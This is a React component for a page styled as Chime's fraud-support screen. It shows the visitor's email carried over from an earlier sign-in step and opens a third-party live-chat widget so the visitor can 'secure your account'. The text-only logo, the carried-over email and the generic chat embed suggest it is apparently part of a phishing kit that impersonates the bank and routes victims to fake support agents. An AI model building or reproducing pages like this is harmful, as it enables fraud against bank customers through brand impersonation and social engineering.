import { useEffect } from "react";
import { Box, Typography, Button, Link, Stack, Divider } from "@mui/material";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import SupportAgentIcon from "@mui/icons-material/SupportAgent";
import { emailStore } from "./authStore";

export default function FraudSupport() {
  // 🔹 Load Tawk script
  useEffect(() => {
      // Attach to window (important)
      window.Tawk_API = window.Tawk_API || {};
      window.Tawk_LoadStart = new Date();
  
      const s1 = document.createElement("script");
      s1.async = true;
      s1.src = "https://embed.tawk.to/6a4af23e4b956a1d4cbbd709/default";
      s1.charset = "UTF-8";
      s1.setAttribute("crossorigin", "*");
  
      document.body.appendChild(s1);
  
      return () => {
        // Clean up when leaving support page
        document.body.removeChild(s1);
      };
    }, []);

    const email = emailStore((state) => state.email);
    
  return (
    <Box
      sx={{
        minHeight: "100vh",
        bgcolor: "#031f1a",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        px: 2,
        color: "white",
      }}
    >
      <Box sx={{ width: 400 }}>
        {/* Logo */}
        <Typography
          variant="h3"
          sx={{ color: "#2de28a", fontWeight: 700, mb: 3 }}
        >
          chime
        </Typography>

        <Typography sx={{ fontSize: "0.95rem" }}>
          {email}
        </Typography>

        {/* Alert */}
        <Box
          sx={{
            display: "flex",
            gap: 2,
            bgcolor: "#102f28",
            p: 2,
            borderRadius: "14px",
            mb: 3,
            alignItems: "center",
          }}
        >
          <WarningAmberIcon sx={{ color: "#f5c542" }} />
          <Typography sx={{ fontSize: "0.95rem" }}>
            Think you’ve been a victim of fraud? Act immediately to secure your
            account.
          </Typography>
        </Box>

        {/* Actions */}
        <Stack spacing={2}>
          <Button
            onClick={() => window.Tawk_API?.toggle()}
            startIcon={<SupportAgentIcon />}
            fullWidth
            sx={btnSecondary}
          >
            Chat with support to secure your account
          </Button>
        </Stack>

        <Divider sx={{ my: 4, borderColor: "#24443d" }} />

        {/* Info */}
        <Typography sx={{ fontSize: "0.9rem", mb: 2 }}>
          Our support team is available 24/7 to help you secure your account,
          review transactions, and take action.
        </Typography>

        {/* Footer */}
        <Typography
          sx={{
            mt: 4,
            fontSize: "0.75rem",
            color: "#8aa39c",
          }}
        >
          © 2026 Chime. All Rights Reserved.
        </Typography>
      </Box>
    </Box>
  );
}

/* 🔹 Button styles */
const btnPrimary = {
  py: 1.4,
  borderRadius: "12px",
  bgcolor: "#2de28a",
  color: "#003d2f",
  textTransform: "none",
  fontWeight: 600,
  "&:hover": {
    bgcolor: "#28c97b",
  },
};

const btnSecondary = {
  py: 1.4,
  borderRadius: "12px",
  bgcolor: "#1b3a33",
  color: "#cfe7df",
  textTransform: "none",
  fontWeight: 600,
  "&:hover": {
    bgcolor: "#22443c",
  },
};

/* 🔹 Link */
function StyledLink({ text }) {
  return (
    <Link
      href="#"
      underline="always"
      sx={{
        display: "block",
        color: "#ffffff",
        fontSize: "0.9rem",
        mb: 1,
        "&:hover": {
          color: "#2de28a",
        },
      }}
    >
      {text}
    </Link>
  );
}
